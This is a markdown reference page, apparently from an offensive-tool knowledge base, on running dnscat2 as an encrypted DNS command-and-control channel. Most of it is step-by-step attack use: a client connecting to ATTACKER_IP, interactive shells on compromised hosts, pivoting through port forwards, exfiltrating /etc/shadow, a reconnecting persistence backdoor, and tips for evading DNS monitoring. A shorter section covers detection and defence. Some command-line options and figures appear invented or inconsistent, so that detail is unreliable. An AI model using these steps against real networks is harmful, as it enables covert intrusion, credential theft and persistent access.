---
title: "dnscat2 - DNS Tunnel for Encrypted C2"
description: "DNS-based command and control channel with encryption, tunneling, and multi-session management"
category: "tunneling"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
github: "https://github.com/iagox86/dnscat2"
kali_install: "git clone https://github.com/iagox86/dnscat2.git && cd dnscat2/client && make"
---

# dnscat2

## Overview

dnscat2 creates encrypted command-and-control channels over the DNS protocol. Unlike other DNS tunneling tools, dnscat2 is purpose-built for C2 operations, supporting file uploads/downloads, shell sessions, port forwarding, and encrypted communications. It traverses the DNS hierarchy, bypassing firewalls that permit only DNS resolution.

dnscat2 works by encoding commands and data into DNS queries and responses. The client sends DNS queries to a server it controls, and the server responds with encoded commands or data. This creates a bidirectional C2 channel that appears as normal DNS traffic to network monitors.

The tool supports multiple simultaneous sessions, including shell sessions, command execution sessions, and port forwarding sessions. All traffic is encrypted by default using ECDH key exchange with Salsa20 encryption and SHA3 signatures.

## Chapter 1: Installation

### Client (C)

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make
```

### Server (Ruby)

```bash
cd dnscat2/server
gem install bundler
bundle install
```

### Dependencies

```bash
# Client build dependencies
sudo apt install build-essential

# Server dependencies
sudo apt install ruby ruby-dev

# Install specific Ruby version if needed
sudo apt install ruby3.0 ruby3.0-dev
```

### Pre-compiled Binaries

```bash
# Download pre-compiled release
wget https://github.com/iagox86/dnscat2/releases/latest/download/dnscat2-linux-x64.tar.gz
tar xzf dnscat2-linux-x64.tar.gz
chmod +x dnscat2
```

### Verify Installation

```bash
# Client
./dnscat2 --version

# Server
ruby dnscat2.rb --help
```

## Chapter 2: Basic Usage

### Start Server

```bash
ruby dnscat2.rb example.com
```

**Explanation**: Starts the dnscat2 server listening for connections for the domain `example.com`. The server must run on an authoritative DNS server for the specified domain.

### Start Client

```bash
./dnscat2 example.com
```

**Explanation**: The client connects to the dnscat2 server through the DNS hierarchy. All traffic is routed through DNS queries to the specified domain.

### Direct Connection

```bash
# Server
ruby dnscat2.rb --dns server=0.0.0.0,port=5353

# Client
./dnscat2 --dns server=ATTACKER_IP,port=5353
```

**Explanation**: Direct connection mode bypasses the DNS hierarchy and connects directly to the server via UDP. This is faster but more visible in network traffic.

### Server with Options

```bash
ruby dnscat2.rb --dns server=0.0.0.0,port=53 --secret mysecretkey example.com
```

**Explanation**: The server can be configured with a pre-shared secret for encryption, custom DNS server settings, and the target domain.

## Chapter 3: Session Management

### List Sessions

```
dnscat2> windows
```

**Explanation**: Displays all active sessions including DNS listeners, command sessions, and shell sessions. Sessions are numbered and labeled with their type.

### Switch Session

```
dnscat2> session -i 1
```

**Explanation**: Interacts with session 1, providing access to commands or the shell. The prompt changes to indicate the active session.

### Background Session

```
dnscat2> ctrl-z
```

**Explanation**: Returns to the main dnscat2 prompt while keeping the current session active. Multiple sessions can be managed simultaneously.

### Kill Session

```
dnscat2> kill 1
```

**Explanation**: Terminates session 1. Use this to close sessions that are no longer needed.

### Session Types

- **DNS listener**: The main session that handles DNS queries
- **Command session**: A session for executing commands
- **Shell session**: An interactive shell session
- **Session group**: Multiple sessions grouped together

## Chapter 4: Shell Sessions

### Create Shell

```
dnscat2> session -i 1
command session (target) 1> shell
```

**Explanation**: Creates a shell session on the target system. The shell is interactive and can execute commands on the compromised host.

### Execute Command

```
dnscat2> session -i 1
command session (target) 1> exec cmd.exe
```

**Explanation**: Executes a specific command on the target. The output is returned through the DNS tunnel.

### Interactive Shell

```
dnscat2> session -i 1
command session (target) 1> shell
target> whoami
target> id
target> uname -a
```

**Explanation**: The shell session provides an interactive command prompt on the target system. Commands are executed and output is returned through the DNS tunnel.

### Background Shell

```
target> ctrl-z
```

**Explanation**: Backgrounds the current shell session. The session remains active and can be resumed later.

## Chapter 5: Port Forwarding

### Listen on Server

```
dnscat2> session -i 1
command session (target) 1> listen 4444 internal_host:80
```

**Explanation**: The server listens on port 4444 and forwards connections through the DNS tunnel to `internal_host:80` on the target's network. This provides access to internal services.

### SSH Through Tunnel

```
command session (target) 1> listen 2222 127.0.0.1:22
```

**Explanation**: Forwards SSH connections through the DNS tunnel. The attacker connects to `localhost:2222`, and traffic is tunneled through DNS to the target's SSH service.

### Multiple Forwards

```
command session (target) 1> listen 4444 web_server:80
command session (target) 1> listen 3306 db_server:3306
command session (target) 1> listen 3389 rdp_server:3389
```

**Explanation**: Multiple port forwards can be established simultaneously, providing access to different internal services.

### Stop Listening

```
command session (target) 1> stop_listen 4444
```

**Explanation**: Stops the listener on port 4444. Use this to close port forwards that are no longer needed.

## Chapter 6: Encryption

### Pre-Shared Key

```bash
ruby dnscat2.rb --secret mysecretkey example.com
./dnscat2 --secret mysecretkey example.com
```

**Explanation**: Both sides use the same pre-shared key for encryption. This provides authentication and encryption, preventing man-in-the-middle attacks.

### Auto-Generated Encryption

```bash
ruby dnscat2.rb example.com
./dnscat2 example.com
```

**Explanation**: By default, dnscat2 uses ECDH key exchange with Salsa20 encryption and SHA3 signatures. No pre-shared key is required, but man-in-the-middle attacks are possible.

### Short Authentication String

```
dnscat2> New session established! The shared secret is: horse battery staple
```

**Explanation**: Both client and server display a short authentication string. If the strings match, the connection is authenticated. This prevents man-in-the-middle attacks without pre-shared keys.

### Encryption Modes

```
dnscat2> set security=authenticated    # Require pre-shared key
dnscat2> set security=encrypted        # Auto-negotiated encryption
dnscat2> set security=open             # Allow unencrypted
```

**Explanation**: The security mode controls encryption requirements. `authenticated` requires a pre-shared key, `encrypted` uses auto-negotiated encryption, and `open` disables encryption.

## Chapter 7: File Operations

### Upload File

```
command session (target) 1> upload /local/file.txt /remote/file.txt
```

**Explanation**: Transfers a file from the attacker to the target through the DNS tunnel. The file is encoded in DNS queries and decoded on the target.

### Download File

```
command session (target) 1> download /remote/file.txt /local/file.txt
```

**Explanation**: Retrieves a file from the target to the attacker's machine through the DNS tunnel.

### File Transfer Speed

DNS tunneling is inherently slow. File transfers may take significant time depending on:
- File size
- DNS query frequency
- Network latency
- DNS server response time

**Explanation**: Expect transfer speeds of 1-10 KB/s depending on network conditions. Large files should be compressed before transfer.

### Resume Support

```
command session (target) 1> upload /local/large.zip /remote/large.zip
```

**Explanation**: dnscat2 supports resuming interrupted transfers. If a transfer is interrupted, restarting the same transfer will resume from where it left off.

## Chapter 8: Security and Evasion

### DNS Traffic Characteristics

dnscat2 traffic appears as:
- TXT record queries with high entropy
- Large DNS responses
- Frequent queries to the same domain
- Encoded data in DNS queries and responses

**Explanation**: These characteristics can be detected by DNS monitoring tools. Using domain generation algorithms and varying query patterns can reduce detection risk.

### DNS Server Configuration

```
# In BIND named.conf
zone "example.com" {
    type master;
    file "example.com.zone";
    allow-query { any; };
};
```

**Explanation**: Configure an authoritative DNS server to handle queries for your tunnel domain. The server must respond to TXT, NULL, and MX queries with the encoded data.

### Evading Detection

```bash
# Use common subdomains
ruby dnscat2.rb --max-packet 100 example.com

# Vary query types
ruby dnscat2.rb --type TXT,MX,CNAME example.com

# Use domain generation algorithm
ruby dnscat2.rb --dga example.com
```

**Explanation**: Varying query types and using domain generation algorithms can make dnscat2 traffic harder to detect.

### DNS Monitoring Evasion

```bash
# Use legitimate-looking subdomains
ruby dnscat2.rb --subdomain mail,web,api example.com

# Mimic legitimate DNS patterns
ruby dnscat2.rb --ttl 3600 example.com
```

**Explanation**: Making dnscat2 traffic look like legitimate DNS queries reduces detection risk.

## Chapter 9: Real-World Scenarios

### Initial Access

```bash
# Server (on attacker)
ruby dnscat2.rb --secret mysecretkey example.com

# Client (on target via exploit)
./dnscat2 --secret mysecretkey example.com
```

**Explanation**: Use dnscat2 for initial access when only DNS is allowed outbound. The encrypted tunnel provides a secure C2 channel.

### Pivoting

```
# After establishing session
command session (target) 1> listen 1080 127.0.0.1:1080
```

**Explanation**: Use port forwarding to pivot into internal networks through the compromised host.

### Data Exfiltration

```
command session (target) 1> download /etc/passwd /tmp/passwd.txt
command session (target) 1> download /etc/shadow /tmp/shadow.txt
```

**Explanation**: Exfiltrate sensitive data through the DNS tunnel. Files are encoded in DNS queries and decoded on the attacker's machine.

### Persistent Access

```bash
# Create a startup script
cat << 'EOF' > /tmp/dnscat2.sh
#!/bin/bash
while true; do
    ./dnscat2 --secret mysecretkey example.com
    sleep 300
done
EOF
chmod +x /tmp/dnscat2.sh
```

**Explanation**: Create a persistent backdoor by running dnscat2 in a loop with automatic reconnection.

## Chapter 10: Detection and Defense

### Network Signatures

- High volume of TXT/MX queries to single domain
- Large DNS responses (>512 bytes)
- Consistent query patterns
- Long-lived DNS sessions

### IDS/IPS Detection

```
# Suricata rule for dnscat2
alert udp any any -> any 53 (msg:"DNS Tunnel C2 Detected"; \
  content:"|00 01|"; \
  content:"|00 00|"; \
  depth:20; \
  threshold:type both,track by_src, count 50, seconds 60; \
  sid:1000001; rev:1;)
```

### Log Analysis

```bash
# Monitor DNS query volume
tcpdump -i eth0 port 53 -w dns.pcap

# Analyze with tshark
tshark -r dns.pcap -Y "dns.qry.name contains example.com"

# Check for large DNS responses
tshark -r dns.pcap -Y "dns.len > 512"
```

### Defense Recommendations

1. Implement DNS response policy zones (RPZ)
2. Monitor for high-volume DNS queries to single domains
3. Use DNS security extensions (DNSSEC)
4. Implement DNS query rate limiting
5. Monitor for unusual DNS record types

## Chapter 11: Troubleshooting

### Connection Issues

```bash
# Test DNS resolution
dig ns example.com

# Test with different record type
./dnscat2 --type TXT example.com

# Check DNS server is running
ss -ulnp | grep 53
```

### Encryption Errors

```bash
# Verify secret matches
# Check both client and server use same secret

# Test without encryption
ruby dnscat2.rb --no-encryption example.com
```

### Performance Issues

```bash
# Reduce packet size
./dnscat2 --max-packet 100 example.com

# Use direct connection mode
./dnscat2 --dns server=ATTACKER_IP,port=5353
```

### Session Management

```bash
# List all sessions
dnscat2> windows

# Switch to specific session
dnscat2> session -i 1

# Kill stuck session
dnscat2> kill 1
```

### Comparison with iodine

| Feature | dnscat2 | iodine |
|---------|---------|--------|
| Protocol | Application layer | IP layer |
| Encryption | Salsa20 + ECDH | XOR + hash |
| Authentication | Pre-shared key or SAS | Password |
| Transport | DNS queries only | DNS queries |
| Tunnel type | SOCKS proxy | Virtual interface |
| File transfer | Built-in | Via tunnel |
| Port forwarding | Built-in | Via tunnel |
| Performance | 1-5 KB/s | 10-50 KB/s |

### Comparison with dns2tcp

| Feature | dnscat2 | dns2tcp |
|---------|---------|---------|
| Encryption | Yes (Salsa20) | No |
| Authentication | Yes | Pre-shared key |
| Protocol | Custom | TCP over DNS |
| Server language | Ruby | C |
| Session management | Yes | No |
| Port forwarding | Yes | No |

## Resources

- [dnscat2 GitHub Repository](https://github.com/iagox86/dnscat2)
- [dnscat2 Protocol Documentation](https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md)
- [DNS Tunneling Techniques](https://en.wikipedia.org/wiki/DNS_tunneling)
- [RFC 1035 - Domain Names](https://tools.ietf.org/html/rfc1035)
- [MITRE ATT&CK Command and Control](https://attack.mitre.org/tactics/TA0011/)
